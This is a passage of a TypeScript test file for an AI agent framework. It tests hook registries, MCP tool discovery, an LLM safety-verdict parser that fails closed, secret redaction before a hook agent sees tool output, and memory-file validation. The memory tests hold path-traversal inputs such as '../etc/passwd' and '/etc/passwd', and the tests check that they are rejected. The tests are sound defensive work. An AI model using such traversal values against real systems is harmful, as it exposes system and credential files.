    // Registry tracks once-hooks and consumes them
    const registry = createHookRegistry();
    registry.register("s1", "agent-1", result.value);
    expect(registry.has("s1")).toBe(true);
    expect(registry.size()).toBe(1);

    // Cleanup works
    registry.cleanup("s1");
    expect(registry.has("s1")).toBe(false);
  });

  test("toolAllowlist: schema validates, mutual exclusivity enforced", async () => {
    const { loadHooks } = await import("@koi/hooks");

    // toolAllowlist validates on agent hooks
    const allowResult = loadHooks([
      {
        kind: "agent",
        name: "restricted-verifier",
        prompt: "Verify the change",
        toolAllowlist: ["Read", "Grep"],
      },
    ]);
    expect(allowResult.ok).toBe(true);
    if (allowResult.ok) {
      const hook = allowResult.value[0];
      expect(hook?.kind).toBe("agent");
      if (hook?.kind === "agent") {
        expect(hook.toolAllowlist).toEqual(["Read", "Grep"]);
      }
    }

    // Mutual exclusivity: both lists set → validation fails
    const conflictResult = loadHooks([
      {
        kind: "agent",
        name: "bad-config",
        prompt: "Verify",
        toolAllowlist: ["Read"],
        toolDenylist: ["Bash"],
      },
    ]);
    expect(conflictResult.ok).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// hook-once ATIF trajectory (golden file)
// ---------------------------------------------------------------------------

describe("hook-once ATIF trajectory (golden file)", () => {
  test("trajectory shows once-hook fires on first tool call only, always-hook fires on both", async () => {
    const trajPath = `${FIXTURES}/hook-once.trajectory.json`;
    const file = Bun.file(trajPath);
    if (!(await file.exists())) {
      console.warn("hook-once.trajectory.json not recorded yet — skipping");
      return;
    }
    const traj = (await file.json()) as {
      readonly steps: readonly {
        readonly step_id: number;
        readonly source: string;
        readonly outcome?: string;
        readonly extra?: Record<string, unknown>;
      }[];
      readonly agent?: { readonly tool_definitions?: readonly { readonly name: string }[] };
    };

    // Trajectory should have steps
    expect(traj.steps.length).toBeGreaterThan(0);

    // Should have model and tool steps
    const modelSteps = traj.steps.filter((s) => s.source === "agent");
    const toolSteps = traj.steps.filter((s) => s.source === "tool");
    expect(modelSteps.length).toBeGreaterThan(0);
    expect(toolSteps.length).toBeGreaterThan(0);

    // add_numbers should be in tool definitions
    const toolNames = traj.agent?.tool_definitions?.map((t) => t.name) ?? [];
    expect(toolNames).toContain("add_numbers");

    // Extract hook execution steps by name
    const hookSteps = traj.steps.filter((s) => s.extra?.type === "hook_execution");
    const onceHookSteps = hookSteps.filter((s) => s.extra?.hookName === "first-tool-guard");
    const alwaysHookSteps = hookSteps.filter((s) => s.extra?.hookName === "always-hook");

    // Once-hook should fire exactly once (first tool call only)
    expect(onceHookSteps).toHaveLength(1);

    // Always-hook should fire on both tool calls (tool.succeeded fires twice)
    expect(alwaysHookSteps.length).toBeGreaterThanOrEqual(2);
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/mcp (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/mcp", () => {
  test("resolver discovers tools from MCP connection and returns ToolDescriptors", async () => {
    const { createMcpResolver, createMcpConnection, resolveServerConfig } = await import(
      "@koi/mcp"
    );
    const { Client } = await import("@modelcontextprotocol/sdk/client/index.js");
    const { InMemoryTransport } = await import("@modelcontextprotocol/sdk/inMemory.js");
    const { Server } = await import("@modelcontextprotocol/sdk/server/index.js");
    const { ListToolsRequestSchema } = await import("@modelcontextprotocol/sdk/types.js");

    // In-process MCP server with one tool
    const server = new Server({ name: "test", version: "1.0.0" }, { capabilities: { tools: {} } });
    server.setRequestHandler(ListToolsRequestSchema, async () => ({
      tools: [
        {
          name: "ping",
          description: "Ping test",
          inputSchema: { type: "object" as const },
        },
      ],
    }));

    const [clientSide, serverSide] = InMemoryTransport.createLinkedPair();
    await server.connect(serverSide);

    const conn = createMcpConnection(
      resolveServerConfig({ kind: "stdio", name: "test-srv", command: "echo" }),
      undefined,
      {
        createClient: () => new Client({ name: "test", version: "1.0.0" }) as never,
        createTransport: () => ({
          start: async () => {},
          close: async () => {
            await clientSide.close();
          },
          sdkTransport: clientSide,
          get sessionId() {
            return undefined;
          },
          onEvent: () => () => {},
        }),
      },
    );

    const resolver = createMcpResolver([conn]);
    const descriptors = await resolver.discover();

    expect(descriptors.length).toBe(1);
    expect(descriptors[0]?.name).toBe("test-srv__ping");
    expect(descriptors[0]?.server).toBe("test-srv");
    expect(descriptors[0]?.origin).toBe("operator");

    resolver.dispose();
    await conn.close();
    await server.close();
  });

  test("ComponentProvider attaches MCP tools as ECS components", async () => {
    const {
      createMcpComponentProvider,
      createMcpResolver,
      createMcpConnection,
      resolveServerConfig,
    } = await import("@koi/mcp");
    const { isAttachResult, agentId } = await import("@koi/core");
    const { Client } = await import("@modelcontextprotocol/sdk/client/index.js");
    const { InMemoryTransport } = await import("@modelcontextprotocol/sdk/inMemory.js");
    const { Server } = await import("@modelcontextprotocol/sdk/server/index.js");
    const { ListToolsRequestSchema, CallToolRequestSchema } = await import(
      "@modelcontextprotocol/sdk/types.js"
    );

    const server = new Server({ name: "test", version: "1.0.0" }, { capabilities: { tools: {} } });
    server.setRequestHandler(ListToolsRequestSchema, async () => ({
      tools: [
        {
          name: "greet",
          description: "Greet someone",
          inputSchema: {
            type: "object" as const,
            properties: { name: { type: "string" } },
          },
        },
      ],
    }));
    server.setRequestHandler(CallToolRequestSchema, async (req) => ({
      content: [{ type: "text" as const, text: `Hello ${String(req.params.arguments?.name)}!` }],
    }));

    const [clientSide, serverSide] = InMemoryTransport.createLinkedPair();
    await server.connect(serverSide);

    const conn = createMcpConnection(
      resolveServerConfig({ kind: "stdio", name: "greet-srv", command: "echo" }),
      undefined,
      {
        createClient: () => new Client({ name: "test", version: "1.0.0" }) as never,
        createTransport: () => ({
          start: async () => {},
          close: async () => {
            await clientSide.close();
          },
          sdkTransport: clientSide,
          get sessionId() {
            return undefined;
          },
          onEvent: () => () => {},
        }),
      },
    );

    const resolver = createMcpResolver([conn]);
    const provider = createMcpComponentProvider({ resolver });

    const agent = {
      pid: { id: agentId("t"), name: "t", type: "worker" as const, depth: 0 },
      manifest: {
        name: "t",
        version: "0.0.0",
        model: { name: "m" },
        tools: [],
        channels: [],
        middleware: [],
      },
      state: "running" as const,
      component: () => undefined,
      has: () => false,
      hasAll: () => false,
      query: () => new Map(),
      components: () => new Map(),
    };

    const result = await provider.attach(agent);
    expect(isAttachResult(result)).toBe(true);
    if (isAttachResult(result)) {
      expect(result.components.size).toBe(1);
      const tool = [...result.components.values()][0] as {
        execute: (args: Record<string, unknown>) => Promise<unknown>;
      };
      const execResult = await tool.execute({ name: "World" });
      expect(execResult).toEqual([{ type: "text", text: "Hello World!" }]);
    }

    resolver.dispose();
    await conn.close();
    await server.close();
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/fs-nexus (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/fs-nexus", () => {
  test("createNexusFileSystem returns a FileSystemBackend with all operations", async () => {
    const { createNexusFileSystem } = await import("@koi/fs-nexus");
    const { createFakeNexusTransport } = await import("@koi/fs-nexus/testing");

    const backend = createNexusFileSystem({
      url: "http://fake",
      transport: createFakeNexusTransport(),
    });

    expect(backend.name).toBe("nexus");
    expect(typeof backend.read).toBe("function");
    expect(typeof backend.write).toBe("function");
    expect(typeof backend.edit).toBe("function");
    expect(typeof backend.list).toBe("function");
    expect(typeof backend.search).toBe("function");
    expect(typeof backend.delete).toBe("function");
    expect(typeof backend.rename).toBe("function");
    expect(typeof backend.dispose).toBe("function");
  });

  test("round-trip write/read through fake transport", async () => {
    const { createNexusFileSystem } = await import("@koi/fs-nexus");
    const { createFakeNexusTransport } = await import("@koi/fs-nexus/testing");

    const backend = createNexusFileSystem({
      url: "http://fake",
      transport: createFakeNexusTransport(),
    });

    const writeResult = await backend.write("/golden/test.txt", "golden content");
    expect(writeResult.ok).toBe(true);

    const readResult = await backend.read("/golden/test.txt");
    expect(readResult.ok).toBe(true);
    if (readResult.ok) {
      expect(readResult.value.content).toBe("golden content");
      expect(readResult.value.path).toBe("/golden/test.txt");
    }
  });

  test("ATIF trajectory: nexus_read tool call captured", () => {
    const { existsSync, readFileSync } = require("node:fs") as typeof import("node:fs");
    const trajectoryPath = `${FIXTURES}/nexus-fs-read.trajectory.json`;
    if (!existsSync(trajectoryPath)) {
      throw new Error(
        "nexus-fs-read.trajectory.json not found. Re-record:\n" +
          "  OPENROUTER_API_KEY=sk-... bun run packages/meta/runtime/scripts/record-cassettes.ts",
      );
    }

    const trajectory = JSON.parse(readFileSync(trajectoryPath, "utf-8")) as {
      readonly steps?: readonly {
        readonly source?: string;
        readonly tool_calls?: readonly { readonly function_name?: string }[];
      }[];
    };

    expect(trajectory.steps).toBeDefined();
    const steps = trajectory.steps ?? [];

    // Should have a tool step with nexus_read
    const toolSteps = steps.filter((s) => s.source === "tool");
    expect(toolSteps.length).toBeGreaterThanOrEqual(1);

    const hasNexusRead = toolSteps.some((s) =>
      s.tool_calls?.some((tc) => tc.function_name === "nexus_read"),
    );
    expect(hasNexusRead).toBe(true);

    // Should have agent steps (model calls)
    const agentSteps = steps.filter((s) => s.source === "agent");
    expect(agentSteps.length).toBeGreaterThanOrEqual(1);
  });

  test("ATIF trajectory: gdrive OAuth E2E — auth_required → callback → token exchange", () => {
    const { existsSync, readFileSync } = require("node:fs") as typeof import("node:fs");
    const trajectoryPath = `${FIXTURES}/gdrive-oauth-e2e.trajectory.json`;
    if (!existsSync(trajectoryPath)) {
      throw new Error(
        "gdrive-oauth-e2e.trajectory.json not found. Re-record via test-gdrive-auth.py",
      );
    }

    const trajectory = JSON.parse(readFileSync(trajectoryPath, "utf-8")) as {
      readonly schema_version: string;
      readonly steps: readonly {
        readonly source: string;
        readonly identifier: string;
        readonly outcome: string;
      }[];
    };

    expect(trajectory.schema_version).toBe("ATIF-v1.6");
    const steps = trajectory.steps;

    // Mount succeeds
    const mountStep = steps.find((s) => s.identifier === "nexus.fs.mount");
    expect(mountStep?.outcome).toBe("success");

    // First read triggers auth failure (no token yet)
    const firstRead = steps.find((s) => s.identifier === "fs.read");
    expect(firstRead?.outcome).toBe("failure");

    // OAuth URL generated with localhost redirect
    const urlStep = steps.find((s) => s.identifier === "generate_auth_url");
    expect(urlStep?.outcome).toBe("success");

    // Browser callback received automatically
    const callbackStep = steps.find((s) => s.identifier === "oauth_callback");
    expect(callbackStep?.outcome).toBe("success");

    // Token exchanged and stored successfully
    const exchangeStep = steps.find((s) => s.identifier === "exchange_auth_code");
    expect(exchangeStep?.outcome).toBe("success");
  });
});

// ---------------------------------------------------------------------------
// Standalone golden queries: @koi/hook-prompt
// ---------------------------------------------------------------------------

describe("Golden: @koi/hook-prompt", () => {
  test("createPromptExecutor produces valid executor and handles structured JSON verdict", async () => {
    const { createPromptExecutor } = await import("@koi/hook-prompt");

    const mockCaller = {
      complete: async () => ({ text: '{ "ok": true, "reason": "safe action" }' }),
    };

    const executor = createPromptExecutor(mockCaller);
    expect(executor.kind).toBe("prompt");

    const decision = await executor.execute(
      { kind: "prompt", name: "test-hook", prompt: "Is this safe?" },
      { event: "tool.before", agentId: "test-agent", sessionId: "test-session" },
    );

    expect(decision.kind).toBe("continue");
  });

  test("parseVerdictOutput handles JSON, denial language, and ambiguous text", async () => {
    const { parseVerdictOutput, VerdictParseError } = await import("@koi/hook-prompt");

    // Structured JSON → parsed verdict
    const jsonResult = parseVerdictOutput('{ "ok": false, "reason": "dangerous" }');
    expect(jsonResult.ok).toBe(false);
    expect(jsonResult.reason).toBe("dangerous");

    // String boolean coercion → preserves model intent
    const coerced = parseVerdictOutput('{ "ok": "true" }');
    expect(coerced.ok).toBe(true);

    // Plain-text denial → blocks (fail-safe)
    const denial = parseVerdictOutput("This operation is unsafe and should be blocked");
    expect(denial.ok).toBe(false);

    // Ambiguous text → throws VerdictParseError (routed through failClosed)
    expect(() => parseVerdictOutput("I think this is fine")).toThrow(VerdictParseError);
  });
});

// ---------------------------------------------------------------------------
// ATIF trajectory: hook-redaction (agent hook on tool.succeeded)
// ---------------------------------------------------------------------------

describe("Golden: hook-redaction trajectory", () => {
  test("ATIF trajectory: success path — hook passes, safe field survives, secrets absent", () => {
    const { existsSync, readFileSync } = require("node:fs") as typeof import("node:fs");
    const trajectoryPath = `${FIXTURES}/hook-redaction.trajectory.json`;
    if (!existsSync(trajectoryPath)) {
      throw new Error(
        "hook-redaction.trajectory.json not found. Re-record:\n" +
          "  OPENROUTER_API_KEY=sk-... bun run packages/meta/runtime/scripts/record-cassettes.ts",
      );
    }

    const trajectory = JSON.parse(readFileSync(trajectoryPath, "utf-8")) as {
      readonly steps?: readonly {
        readonly source?: string;
        readonly outcome?: string;
        readonly message?: string;
        readonly duration_ms?: number;
        readonly extra?: {
          readonly type?: string;
          readonly hookName?: string;
          readonly middlewareName?: string;
          readonly hook?: string;
          readonly phase?: string;
        };
        readonly tool_calls?: readonly { readonly function_name?: string }[];
        readonly observation?: {
          readonly results?: readonly { readonly content?: string }[];
        };
      }[];
    };

    expect(trajectory.steps).toBeDefined();
    const steps = trajectory.steps ?? [];

    // Should have a tool step with get_credentials
    const toolSteps = steps.filter((s) => s.source === "tool");
    expect(toolSteps.length).toBeGreaterThanOrEqual(1);

    const hasCredentialsTool = toolSteps.some((s) =>
      s.tool_calls?.some((tc) => tc.function_name === "get_credentials"),
    );
    expect(hasCredentialsTool).toBe(true);

    // Should have agent steps (model calls)
    const agentSteps = steps.filter((s) => s.source === "agent");
    expect(agentSteps.length).toBeGreaterThanOrEqual(1);

    // SUCCESS-PATH: coreHookMw (createHookMiddleware) is the only dispatcher
    // that runs agent hooks here, so the evidence of a real hook-agent call
    // is the "hooks" middleware's wrapToolCall span — its duration must be
    // non-trivial because it awaits a real LLM verdict. A short/missing
    // span would mean the hook agent never actually ran.
    const hooksToolSpans = steps.filter(
      (s) =>
        s.extra?.middlewareName === "hooks" &&
        s.extra?.hook === "wrapToolCall" &&
        s.outcome === "success",
    );
    expect(hooksToolSpans.length).toBeGreaterThanOrEqual(1);
    const longestHooksSpan = Math.max(...hooksToolSpans.map((s) => s.duration_ms ?? 0));
    // Real LLM verdict calls take >100ms. A span <100ms means the hook agent
    // was never spawned (regression: spawnFn not wired, or hooks never fired).
    expect(longestHooksSpan).toBeGreaterThan(100);

    // SUCCESS-PATH: the redacted payload must reach the model AND survive as
    // real tool output. The "[output redacted: Post-hook" marker is emitted
    // by createHookMiddleware.wrapToolCall when the aggregated post-hook
    // decision is block — its presence means the hook turned a safe request
    // into an unconditional denial, which is the user-visible regression
    // the original #1492 golden canonized.
    const fullJson = readFileSync(trajectoryPath, "utf-8");
    expect(fullJson).not.toContain("Post-hook(s) failed: secret-scanner");
    expect(fullJson).not.toContain("[output redacted: Post-hook");

    // SUCCESS-PATH: the non-secret `host` field must be preserved through
    // redaction so the final answer can actually report it. If redaction
    // masks every field, the agent has nothing to report and the golden
    // no longer proves redaction is scoped to secrets.
    expect(fullJson).toContain("db.example.com");

    // NO-LEAK: the model's FINAL response must never contain raw secrets.
    // The trajectory legitimately contains raw tool output (by design —
    // the tool's return value flows to the parent model), and the test
    // fixtures use obviously-fake placeholder strings. The user-visible
    // channel that MUST NOT leak is the model's final answer. If a future
    // change lets the model echo secrets back to the user, this assertion
    // fails regardless of whether the tool output was scrubbed.
    const finalAgentStep = agentSteps[agentSteps.length - 1];
    const finalContent = finalAgentStep?.observation?.results?.[0]?.content ?? "";
    expect(finalContent).not.toContain("sk-ant-api03-");
    expect(finalContent).not.toContain("super-secret-pw-123");

    // CRITICAL: raw secrets must never cross into the hook-agent trust
    // boundary. The hook agent's user input (produced by buildHookPrompts →
    // redactEventData) is captured to `hook-redaction.hook-inputs.json`
    // during recording — this is what the sub-agent actually saw.
    //
    // The tool's raw output still reaches the parent model (so it can report
    // `host`), and the trajectory records that raw output — that is by
    // design. Redaction is scoped to the hook-agent path, and that's what
    // this fixture proves.
    const hookInputsPath = `${FIXTURES}/hook-redaction.hook-inputs.json`;
    if (!existsSync(hookInputsPath)) {
      throw new Error(
        "hook-redaction.hook-inputs.json not found. Re-record:\n" +
          "  OPENROUTER_API_KEY=sk-... bun run packages/meta/runtime/scripts/record-cassettes.ts",
      );
    }
    const hookInputsRaw = readFileSync(hookInputsPath, "utf-8");
    const hookInputs = JSON.parse(hookInputsRaw) as {
      readonly inputs: readonly { readonly hookName: string; readonly userInput: string }[];
    };
    const scannerInputs = hookInputs.inputs.filter(
      (i) => i.hookName === "hook-agent:secret-scanner",
    );
    expect(scannerInputs.length).toBeGreaterThanOrEqual(1);
    // Raw credentials must be stripped from every hook-agent prompt
    for (const input of scannerInputs) {
      expect(input.userInput).toContain("redacted");
      expect(input.userInput).not.toContain("sk-ant-api03-");
      expect(input.userInput).not.toContain("super-secret-pw-123");
    }
    // At least one invocation must carry the actual post-tool payload with
    // redaction markers on the secret fields (proves redaction actually
    // traversed the object, not just that the envelope note was attached).
    const payloadInput = scannerInputs.find((i) => i.userInput.includes("[REDACTED]"));
    expect(payloadInput).toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// Standalone golden queries: @koi/hooks payload redaction
// ---------------------------------------------------------------------------

describe("Golden: @koi/hooks payload redaction", () => {
  test("redactEventData masks API keys and passwords", async () => {
    const { redactEventData } = await import("@koi/hooks");
    const result = redactEventData(
      { apiKey: `sk-ant-api03-${"A".repeat(85)}`, password: "hunter2", safe: "hello" },
      undefined, // default config = redaction enabled
    );
    expect(result.status).toBe("redacted");
    expect(JSON.stringify(result.data)).not.toContain("sk-ant-api03");
    expect(JSON.stringify(result.data)).not.toContain("hunter2");
    expect(JSON.stringify(result.data)).toContain("hello");
  });

  test("redactEventData with mask strategy produces partial mask", async () => {
    const { redactEventData } = await import("@koi/hooks");
    // Use a non-sensitive field name so the secret is detected by pattern scanning
    // (not field-name matching which always uses "redact" → [REDACTED])
    const result = redactEventData(
      { output: `token is sk-ant-api03-${"A".repeat(85)}` },
      { enabled: true, censor: "mask" },
    );
    expect(result.status).toBe("redacted");
    const json = JSON.stringify(result.data);
    // Mask strategy preserves first 4 chars + *** for pattern-detected secrets
    expect(json).toContain("***");
    expect(json).not.toContain("A".repeat(85));
  });

  test("extractStructure produces type placeholders without values", async () => {
    const { extractStructure } = await import("@koi/hooks");
    const structure = extractStructure({ name: "secret-agent", count: 42, active: true });
    expect(structure).toBeDefined();
    const json = JSON.stringify(structure);
    expect(json).not.toContain("secret-agent");
    expect(json).not.toContain("42");
  });

  test("redactEventData with custom sensitiveFields", async () => {
    const { redactEventData } = await import("@koi/hooks");
    const result = redactEventData(
      { myCustomSecret: "very-sensitive-data", normal: "visible" },
      { enabled: true, sensitiveFields: ["myCustomSecret"] },
    );
    expect(result.status).toBe("redacted");
    expect(JSON.stringify(result.data)).not.toContain("very-sensitive-data");
    expect(JSON.stringify(result.data)).toContain("visible");
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/memory (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/memory", () => {
  test("frontmatter + index roundtrip with validation and injection safety", async () => {
    const {
      parseMemoryFrontmatter,
      serializeMemoryFrontmatter,
      formatMemoryIndexEntry,
      parseMemoryIndexEntry,
      validateMemoryRecordInput,
      validateMemoryFilePath,
      hasFrontmatterUnsafeChars,
      isMemoryType,
      memoryRecordId,
      ALL_MEMORY_TYPES,
    } = await import("@koi/core");

    // All 4 memory types are valid
    for (const t of ALL_MEMORY_TYPES) {
      expect(isMemoryType(t)).toBe(true);
    }
    expect(isMemoryType("bogus")).toBe(false);

    // Branded constructor — produces branded string
    const id = memoryRecordId("test-memory-1");
    expect(String(id)).toBe("test-memory-1");

    // Frontmatter roundtrip: serialize → parse → identical
    const frontmatter = {
      name: "User role",
      description: "Senior engineer",
      type: "user" as const,
    };
    const content = "Deep Go expertise, new to React.";
    const serialized = serializeMemoryFrontmatter(frontmatter, content);
    expect(serialized).toBeDefined();
    if (serialized === undefined) throw new Error("serialized is undefined");
    expect(serialized).toContain("---");
    expect(serialized).toContain("name: User role");
    expect(serialized).toContain("type: user");
    expect(serialized).toContain(content);

    const parsed = parseMemoryFrontmatter(serialized);
    expect(parsed).toBeDefined();
    if (parsed === undefined) throw new Error("parsed is undefined");
    expect(parsed.frontmatter.name).toBe("User role");
    expect(parsed.frontmatter.description).toBe("Senior engineer");
    expect(parsed.frontmatter.type).toBe("user");
    expect(parsed.content).toBe(content);

    // Index entry roundtrip: format → parse → identical
    const entry = { title: "User role", filePath: "user_role.md", hook: "Senior engineer info" };
    const line = formatMemoryIndexEntry(entry);
    expect(line).toBeDefined();
    if (line === undefined) throw new Error("line is undefined");
    expect(line).toContain("[User role]");
    expect(line).toContain("(user_role.md)");

    const parsedEntry = parseMemoryIndexEntry(line);
    expect(parsedEntry).toBeDefined();
    if (parsedEntry === undefined) throw new Error("parsedEntry is undefined");
    expect(parsedEntry.title).toBe(entry.title);
    expect(parsedEntry.filePath).toBe(entry.filePath);
    expect(parsedEntry.hook).toBe(entry.hook);

    // Validate valid input — empty array means no errors
    const validInput = {
      name: "Feedback on testing",
      description: "Always write failing tests first",
      type: "feedback",
      content: "Rule: write failing tests.\n**Why:** catches regressions.",
      filePath: "feedback_testing.md",
    };
    const inputErrors = validateMemoryRecordInput(validInput);
    expect(inputErrors).toHaveLength(0);

    // Validate valid file path — undefined means no error
    const pathError = validateMemoryFilePath("feedback_testing.md");
    expect(pathError).toBeUndefined();

    // Injection safety: newlines in frontmatter fields are unsafe
    expect(hasFrontmatterUnsafeChars("clean value")).toBe(false);
    expect(hasFrontmatterUnsafeChars("line1\nline2")).toBe(true);
    // Tab (\x09) is intentionally allowed — only control chars \x00-\x08 are blocked
    expect(hasFrontmatterUnsafeChars("has\x01control")).toBe(true);

    // Path traversal rejected — returns error string
    const traversalError = validateMemoryFilePath("../etc/passwd");
    expect(traversalError).toBeDefined();

    // Non-.md extension rejected
    const extError = validateMemoryFilePath("secrets.json");
    expect(extError).toBeDefined();
  });

  test("collective memory scoring, deduplication, budget selection, and compaction", async () => {
    const { computeMemoryPriority, deduplicateEntries, selectEntriesWithinBudget, compactEntries } =
      await import("@koi/validation");
    const { COLLECTIVE_MEMORY_DEFAULTS } = await import("@koi/core");
    type CollectiveMemoryEntry = import("@koi/core").CollectiveMemoryEntry;

    const now = Date.now();
    const MS_PER_DAY = 86_400_000;

    const makeEntry = (
      id: string,
      content: string,
      accessCount: number,
      daysAgo: number,
    ): CollectiveMemoryEntry => ({
      id,
      content,
      category: "heuristic",
      source: { agentId: "test", runId: "run-1", timestamp: now - daysAgo * MS_PER_DAY },
      createdAt: now - daysAgo * MS_PER_DAY,
      accessCount,
      lastAccessedAt: now - daysAgo * MS_PER_DAY,
    });

    // Priority scoring: recent + high access > stale + low access
    const recent = makeEntry("e1", "recent entry", 5, 1);
    const stale = makeEntry("e2", "stale entry", 1, 60);
    expect(computeMemoryPriority(recent, now)).toBeGreaterThan(computeMemoryPriority(stale, now));

    // Deduplication: near-identical content merged
    const original = makeEntry("e3", "always use bun test for running tests", 3, 2);
    const duplicate = makeEntry("e4", "always use bun test for running all tests", 1, 5);
    const unique = makeEntry("e5", "never force push to main branch", 2, 3);
    const deduped = deduplicateEntries([original, duplicate, unique], 0.6, now);
    // Duplicate should be removed, keeping the higher-priority one
    expect(deduped.length).toBeLessThan(3);
    expect(deduped.some((e) => e.id === "e5")).toBe(true); // unique preserved

    // Budget selection: respects token limit
    const entries = [
      makeEntry("b1", "A".repeat(100), 3, 1),
      makeEntry("b2", "B".repeat(100), 2, 2),
      makeEntry("b3", "C".repeat(100), 1, 3),
    ];
    // Very small budget — should not return all entries
    const selected = selectEntriesWithinBudget(entries, 50, 4, now);
    expect(selected.length).toBeLessThan(entries.length);

    // Compaction: full pipeline — prune → dedup → trim → generation increment
    const memory = {
      entries: [
        makeEntry("c1", "active entry", 5, 1),
        makeEntry("c2", "never accessed stale entry", 0, 60),
        makeEntry("c3", "another active entry", 3, 2),
      ],
      totalTokens: 300,
      generation: 0,
    };
    const compacted = compactEntries(memory, COLLECTIVE_MEMORY_DEFAULTS, now);
    // Generation should increment
    expect(compacted.generation).toBe(1);
    // Stale never-accessed entry (c2, 60 days old > 30 day coldAgeDays) should be pruned
    expect(compacted.entries.some((e) => e.id === "c2")).toBe(false);
    // Active entries survive
    expect(compacted.entries.some((e) => e.id === "c1")).toBe(true);
  });

  test("memory_store rejects adversarial file paths end-to-end", async () => {
    const { serializeMemoryFrontmatter, validateMemoryFilePath, validateMemoryRecordInput } =
      await import("@koi/core");

    // Replicate memory_store execute logic (same as record-cassettes.ts)
    const executeMemoryStore = (args: {
      readonly name: string;
      readonly description: string;
      readonly type: string;
      readonly content: string;
    }): {
      readonly ok: boolean;
      readonly errors?: readonly { readonly field: string; readonly message: string }[];
    } => {
      const input = {
        name: args.name,
        description: args.description,
        type: args.type,
        content: args.content,
        filePath: `${args.name.toLowerCase().replace(/\s+/g, "_")}.md`,
      };
      const pathError = validateMemoryFilePath(input.filePath);
      if (pathError !== undefined) {
        return { ok: false, errors: [{ field: "filePath", message: pathError }] };
      }
      const errors = validateMemoryRecordInput(input);
      if (errors.length > 0) {
        return { ok: false, errors: errors.map((e) => ({ field: e.field, message: e.message })) };
      }
      const frontmatter = {
        name: input.name,
        description: input.description,
        type: input.type as "user" | "feedback" | "project" | "reference",
      };
      const serialized = serializeMemoryFrontmatter(frontmatter, input.content);
      if (serialized === undefined) {
        return { ok: false, errors: [{ field: "type", message: "invalid memory type" }] };
      }
      return { ok: true };
    };

    const base = { description: "test", type: "feedback", content: "body" };

    // Path traversal: ../secrets → ../secrets.md → rejected
    const traversal = executeMemoryStore({ ...base, name: "../secrets" });
    expect(traversal.ok).toBe(false);

    // Absolute path: /etc/passwd → /etc/passwd.md → rejected
    const absolute = executeMemoryStore({ ...base, name: "/etc/passwd" });
    expect(absolute.ok).toBe(false);

    // Valid name works
    const valid = executeMemoryStore({ ...base, name: "testing approach" });
    expect(valid.ok).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/memory-tools (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/memory-tools", () => {
  test("createMemoryToolProvider builds all 4 tools and provider attaches them", async () => {
    const { createMemoryToolProvider } = await import("@koi/memory-tools");
    const { toolToken, memoryRecordId: mkId } = await import("@koi/core");
    type MRecord = import("@koi/core").MemoryRecord;
    type MInput = import("@koi/core").MemoryRecordInput;

    const mockBackend = {
      store: (input: MInput) => {
        const record: MRecord = {
          id: mkId("mock-1"),
          ...input,
          filePath: "test.md",
          createdAt: 0,
          updatedAt: 0,
        };
        return { ok: true as const, value: record };
      },
      storeWithDedup: (input: MInput, _opts: { readonly force: boolean }) => {
        const record: MRecord = {
          id: mkId("mock-1"),
          ...input,
          filePath: "test.md",
          createdAt: 0,
          updatedAt: 0,
        };
        return { ok: true as const, value: { action: "created" as const, record } };
      },
      recall: () => ({ ok: true as const, value: [] as readonly MRecord[] }),
      search: () => ({ ok: true as const, value: [] as readonly MRecord[] }),
      delete: () => ({ ok: true as const, value: { wasPresent: true } }),
      findByName: () => ({ ok: true as const, value: undefined as MRecord | undefined }),
      get: () => ({ ok: true as const, value: undefined as MRecord | undefined }),
      update: (
        _id: import("@koi/core").MemoryRecordId,
        _patch: import("@koi/core").MemoryRecordPatch,
      ) => {
        const r: MRecord = {
          id: mkId("mock-1"),
          name: "",
          description: "",
          type: "user",
          content: "",
          filePath: "",
          createdAt: 0,
          updatedAt: 0,
        };
        return { ok: true as const, value: r };
      },
    };

    const result = createMemoryToolProvider({ backend: mockBackend, memoryDir: "/tmp/koi-memory" });
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    const provider = result.value;
    expect(provider.name).toBe("memory-tools");

    const attachResult = await provider.attach({} as Parameters<typeof provider.attach>[0]);
    const components = "components" in attachResult ? attachResult.components : attachResult;

    expect(components.has(toolToken("memory_store") as string)).toBe(true);
    expect(components.has(toolToken("memory_recall") as string)).toBe(true);
    expect(components.has(toolToken("memory_search") as string)).toBe(true);
    expect(components.has(toolToken("memory_delete") as string)).toBe(true);
  });

  test("memory_store tool executes store with dedup and returns structured result", async () => {
    const { createMemoryStoreTool } = await import("@koi/memory-tools");
    const { memoryRecordId: mkId } = await import("@koi/core");
    type MRecord = import("@koi/core").MemoryRecord;

    const stored: MRecord = {
      id: mkId("rec-1"),
      name: "test",
      description: "desc",
      type: "user",
      content: "body",
      filePath: "test.md",
      createdAt: 0,
      updatedAt: 0,
    };
    const backend = {
      store: () => ({ ok: true as const, value: stored }),
      storeWithDedup: () => ({
        ok: true as const,
        value: { action: "created" as const, record: stored },
      }),
      recall: () => ({ ok: true as const, value: [] as readonly MRecord[] }),
      search: () => ({ ok: true as const, value: [] as readonly MRecord[] }),
      delete: () => ({ ok: true as const, value: { wasPresent: true } }),
      findByName: () => ({ ok: true as const, value: undefined as MRecord | undefined }),
      get: () => ({ ok: true as const, value: undefined as MRecord | undefined }),
      update: () => ({ ok: true as const, value: stored }),
    };

    const result = createMemoryStoreTool(backend, "/tmp/koi-memory");
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    const tool = result.value;
    expect(tool.descriptor.name).toBe("memory_store");

    const output = (await tool.execute({
      name: "test",
      description: "desc",
      type: "user",
      content: "body",
    })) as Record<string, unknown>;
    expect(output.stored).toBe(true);
    expect(output.id).toBe("rec-1");
  });
});

// ---------------------------------------------------------------------------
// memory-store trajectory: full-stack ATIF validation (golden file)
// ---------------------------------------------------------------------------

describe("memory-store ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with session_id and memory tool definitions", async () => {
    const doc = (await Bun.file(`${FIXTURES}/memory-store.trajectory.json`).json()) as {
      readonly schema_version: string;
      readonly session_id: string;
      readonly agent: {
        readonly model_name?: string;
        readonly tool_definitions?: readonly { readonly name: string }[];
      };
    };

